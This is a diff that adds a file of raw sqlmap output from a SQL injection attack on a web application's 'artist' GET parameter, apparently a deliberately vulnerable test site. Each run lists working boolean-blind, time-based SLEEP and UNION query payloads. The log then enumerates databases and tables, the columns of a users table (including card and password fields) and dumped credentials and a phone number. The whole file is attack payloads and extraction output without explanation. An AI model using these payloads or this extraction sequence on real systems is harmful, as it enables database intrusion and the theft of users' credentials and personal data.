@@ -1,0 +1,141 @@
+sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 1384=1384
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 8376 FROM (SELECT(SLEEP(5)))xExj)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-1567 UNION ALL SELECT NULL,CONCAT(0x7170787171,0x4c6954796a516a544272577369726f65674d6c635266675a49684c7a75484e526c555247626a6a6a,0x717a706b71),NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 1384=1384
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 8376 FROM (SELECT(SLEEP(5)))xExj)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-1567 UNION ALL SELECT NULL,CONCAT(0x7170787171,0x4c6954796a516a544272577369726f65674d6c635266675a49684c7a75484e526c555247626a6a6a,0x717a706b71),NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+Database: acuart
+[8 tables]
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 1384=1384
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 8376 FROM (SELECT(SLEEP(5)))xExj)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-1567 UNION ALL SELECT NULL,CONCAT(0x7170787171,0x4c6954796a516a544272577369726f65674d6c635266675a49684c7a75484e526c555247626a6a6a,0x717a706b71),NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+Database: acuart
+Table: users
+[8 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| name    | varchar(100) |
+| address | mediumtext   |
+| cart    | varchar(100) |
+| cc      | varchar(100) |
+| email   | varchar(100) |
+| pass    | varchar(100) |
+| phone   | varchar(100) |
+| uname   | varchar(100) |
++---------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 1384=1384
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 8376 FROM (SELECT(SLEEP(5)))xExj)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-1567 UNION ALL SELECT NULL,CONCAT(0x7170787171,0x4c6954796a516a544272577369726f65674d6c635266675a49684c7a75484e526c555247626a6a6a,0x717a706b71),NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.0.12
+Database: acuart
+Table: users
+[1 entry]
++-------+------+
+| uname | pass |
++-------+------+
+| test  | test |
++-------+------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 1384=1384
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 8376 FROM (SELECT(SLEEP(5)))xExj)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-1567 UNION ALL SELECT NULL,CONCAT(0x7170787171,0x4c6954796a516a544272577369726f65674d6c635266675a49684c7a75484e526c555247626a6a6a,0x717a706b71),NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.0.12
+Database: acuart
+Table: users
+[1 entry]
++---------+
+| phone   |
++---------+
+| 2323345 |
++---------+
+
